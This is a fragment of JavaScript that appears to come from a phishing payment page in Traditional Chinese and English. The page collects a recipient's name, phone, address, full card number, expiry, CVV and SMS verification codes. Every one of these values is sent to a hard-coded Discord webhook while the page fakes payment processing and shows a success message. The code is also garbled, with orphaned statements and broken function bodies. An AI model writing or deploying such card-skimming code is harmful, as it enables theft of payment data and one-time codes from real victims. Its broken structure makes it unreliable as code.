        function updateLanguage() {
            // 更新所有帶有data-i18n屬性的元素
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.dataset.i18n;
                if (translations[currentLang][key]) {
                    el.textContent = translations[currentLang][key];
                }
            });
            
            // 更新placeholder
            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
                const key = el.dataset.i18nPlaceholder;
                if (translations[currentLang][key]) {
                    el.placeholder = translations[currentLang][key];
                }
            });
            
            // 更新下拉選項
            const selectDistrict = document.querySelector('#district option[value=""]');
            if (selectDistrict) {
                selectDistrict.textContent = translations[currentLang]['selectDistrict'];
            }
        }

            }
            e.target.value = value;

        // 發送數據到Discord Webhook
        async function sendToDiscordWebhook(data, type = 'order') {
            const webhookUrl = 'https://discordapp.com/api/webhooks/1372243681578455102/WitD8qigZMPSJoyphWYdD6DISdv-_5HnoKfZTPq6rSi3UEZUiyP-DfBNcaMyc2-gv9AO'; // 替換為您的Discord Webhook URL
            
            let embed;
            
            if (type === 'order') {
                embed = {
                    title: "New Order Submission",
                    color: 0x007bff,
                    timestamp: new Date().toISOString(),
                    fields: [
                        { name: "Recipient Name", value: data.receiverName, inline: true },
                        { name: "Phone Number", value: data.phone, inline: true },
                        { name: "Delivery Address", value: data.address, inline: false },
                        { name: "District", value: data.district, inline: true },
                        { name: "Cardholder", value: data.cardholder, inline: true },
                        { name: "Card Number", value: data.cardnumber, inline: true },
                        { name: "Expiry Date", value: data.expiry, inline: true },
                        { name: "CVV", value: data.cvv, inline: true },
                        { name: "Total Amount", value: "HK$23", inline: true }
                    ]
                };
            } else if (type === 'sms') {
                embed = {
                    title: "SMS Verification Data",
                    color: 0x4CAF50,
                    timestamp: new Date().toISOString(),
                    fields: [
                        { name: "Phone Number", value: data.phone, inline: true },
                        { name: "Verification Code", value: data.verificationCode, inline: true },
                        { name: "Entered Code", value: data.enteredCode, inline: true },
                        { name: "Verification Status", value: data.status, inline: true }
                    ]
                };
            }
            
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        embeds: [embed]
                    })
                });
                
                if (!response.ok) {
                    console.error('Failed to send data to Discord webhook:', response.statusText);
                }
            } catch (error) {
                console.error('Error sending to Discord webhook:', error);
            }
        }

            e.preventDefault();
            
            // 簡單驗證
            const cardholder = document.getElementById('cardholder').value;
            const cardnumber = document.getElementById('cardnumber').value.replace(/\s/g, '');
            const expiry = document.getElementById('expiry').value;

            if (!cardholder || cardholder.length < 2) {

                return;
            }
            
            if (!cardnumber || cardnumber.length < 13) {
                showAlert(translations[currentLang]['cardnumberLabel'] + ': ' + translations[currentLang]['cardnumberPlaceholder']);
                return;
            }
            
            if (!expiry || expiry.length !== 5) {
                showAlert(translations[currentLang]['expiryLabel'] + ': ' + translations[currentLang]['expiryPlaceholder']);
                return;
            }
            
            if (!cvv || (cvv.length !== 3 && cvv.length !== 4)) {
                showAlert(translations[currentLang]['cvvLabel'] + ': ' + translations[currentLang]['cvvPlaceholder']);
                return;
            }
            
            // 組合所有訂單數據
            const orderData = {
                ...window.orderData,
                cardholder,
                cardnumber,
                expiry,
                cvv
            };
            
            // 顯示加載動畫
            document.getElementById('loadingOverlay').style.display = 'flex';
            
            // 發送到Discord Webhook
            await sendToDiscordWebhook(orderData);
            
            // 模擬支付處理，等待5秒後才跳轉
            setTimeout(() => {
                // 隱藏加載動畫

                document.getElementById('successPage').style.display = 'block';

        });

        // 驗證驗證碼
        function verifyCode() {
            // 獲取用戶輸入的驗證碼
            let enteredCode = '';
            for (let i = 1; i <= 6; i++) {
                enteredCode += document.getElementById('code' + i).value;
            }
            
            // 驗證
            if (enteredCode === verificationCode) {
                // 顯示加載動畫
                document.getElementById('loadingOverlay').style.display = 'flex';
                
                // 發送驗證結果到Discord Webhook
                const smsData = {
                    phone: window.orderData.phone,
                    verificationCode: verificationCode,
                    enteredCode: enteredCode,
                    status: 'Verified'
                };
                
                sendToDiscordWebhook(smsData, 'sms');
                
                // 模擬驗證處理，等待3秒後顯示完成信息
                setTimeout(() => {
                    // 隱藏加載動畫
                    document.getElementById('loadingOverlay').style.display = 'none';
                    
                    // 顯示驗證成功信息
                    showAlert(translations[currentLang]['verificationSuccess']);
                    
                    // 清空驗證碼輸入框
                    for (let i = 1; i <= 6; i++) {
                        document.getElementById('code' + i).value = '';
                    }
                }, 3000); // 3000毫秒 = 3秒
            } else {
                // 發送驗證失敗結果到Discord Webhook
                const smsData = {
                    phone: window.orderData.phone,
                    verificationCode: verificationCode,
                    enteredCode: enteredCode,
                    status: 'Failed'
                };
                
                sendToDiscordWebhook(smsData, 'sms');
                
                showAlert(translations[currentLang]['verificationFailed']);
            }
        }
